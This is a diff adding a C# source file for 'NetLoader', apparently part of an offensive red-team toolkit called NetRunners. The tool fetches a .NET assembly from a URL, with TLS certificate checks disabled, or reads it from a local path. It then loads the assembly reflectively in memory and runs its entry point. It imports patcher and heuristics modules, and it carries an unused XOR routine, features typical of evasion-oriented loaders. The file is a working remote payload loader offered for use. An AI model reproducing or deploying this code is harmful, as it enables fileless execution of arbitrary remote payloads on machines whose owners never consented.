@@ -1,0 +1,152 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using System.Text;
+
+using static NetRunners.Patchers.Patcher;
+using static NetRunners.Heuristics.Heuristics;
+
+namespace NetRunners.Loader
+{
+	public class NetLoader
+	{
+		// Consolidated argument parsing logic into a single method.
+		private static (string payloadPathOrUrl, string[] payloadArgs) ParseArguments(string[] args)
+		{
+			string payloadPathOrUrl = "";
+			string[] payloadArgs = Array.Empty<string>();
+
+			foreach (string argument in args)
+			{
+				switch (argument.ToLower())
+				{
+					case "-path":
+					case "--path":
+						payloadPathOrUrl = GetNextArgValue(args, argument);
+						break;
+
+					case "-args":
+					case "--args":
+						payloadArgs = GetArgsValues(args, argument);
+						break;
+				}
+			}
+
+			return (payloadPathOrUrl, payloadArgs);
+		}
+
+		// Helper method to get the next argument's value, applying Base64 decoding if needed.
+		private static string GetNextArgValue(string[] args, string argument)
+		{
+			int index = Array.IndexOf(args, argument) + 1;
+			if (index < args.Length)
+			{
+				string value = args[index];
+				return value;
+			}
+			return "";
+		}
+
+		// Helper method to get all values following an argument, useful for -args processing.
+		private static string[] GetArgsValues(string[] args, string argument)
+		{
+			int index = Array.IndexOf(args, argument) + 1;
+			if (index < args.Length)
+			{
+				int count = args.Length - index;
+				string[] values = new string[count];
+				for (int i = 0; i < count; i++)
+				{
+					string value = args[index + i];
+					values[i] = value;
+				}
+				return values;
+			}
+			return Array.Empty<string>();
+		}
+
+		public static void Main(string[] args)
+		{
+			// Parse the command line arguments in a single step.
+			var (payloadPathOrUrl, payloadArgs) = ParseArguments(args);
+
+			if (string.IsNullOrEmpty(payloadPathOrUrl))
+			{
+				PrintHelp();
+				return; // Exit if mandatory arguments are missing.
+			}
+
+			// Security protocol type handling simplified into a single line, assuming 3072 as a placeholder value.
+			ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+
+			TriggerPayload(payloadPathOrUrl, payloadArgs);
+		}
+
+		private static void PrintHelp()
+		{
+			Console.WriteLine("Usage: ");
+		}
+
+		private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs)
+		{
+			Console.WriteLine($"[+] URL/PATH : {payloadPathOrURL} Arguments : {string.Join(" ", inputArgs)}");
+
+			byte[] data = payloadPathOrURL.StartsWith("http", StringComparison.OrdinalIgnoreCase)
+				? DownloadUrl(payloadPathOrURL)
+				: ReadLocalFilePath(payloadPathOrURL, FileMode.Open);
+
+			InvokeCSharpMethod(LoadAssembly(data));
+		}
+		// Simplified method names and reduced redundancy
+		private static Assembly LoadAssembly(byte[] data)
+		{
+			return Assembly.Load(data);
+		}
+
+		private static byte[] ReadLocalFilePath(string filePath, FileMode fileMode)
+		{
+			using (FileStream fs = new FileStream(filePath, fileMode, FileAccess.Read))
+			{
+				byte[] buffer = new byte[fs.Length];
+				fs.Read(buffer, 0, buffer.Length);
+				return buffer;
+			}
+		}
+
+		private static byte[] DownloadUrl(string url)
+		{
+			ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
+			using (WebClient client = new WebClient())
+			{
+				return client.DownloadData(url);
+			}
+		}
+
+		private static byte[] XorEncDec(byte[] data, string key)
+		{
+			byte[] keyBytes = Encoding.UTF8.GetBytes(key);
+			for (int i = 0; i < data.Length; i++)
+			{
+				data[i] ^= keyBytes[i % keyBytes.Length];
+			}
+			return data;
+		}
+
+		// Simplified method to invoke entry point of the assembly
+		private static void InvokeCSharpMethod(Assembly assembly)
+		{
+			MethodInfo entryPoint = assembly.EntryPoint;
+			if (entryPoint != null)
+			{
+				ParameterInfo[] parameters = entryPoint.GetParameters();
+				object[] args = parameters.Length > 0 ? new object[] { new string[0] } : null; // Adjust if your method expects arguments
+				entryPoint.Invoke(null, args);
+			}
+			else
+			{
+				Console.WriteLine("[-] Entry point not found in the assembly.");
+			}
+		}
+	}
+}
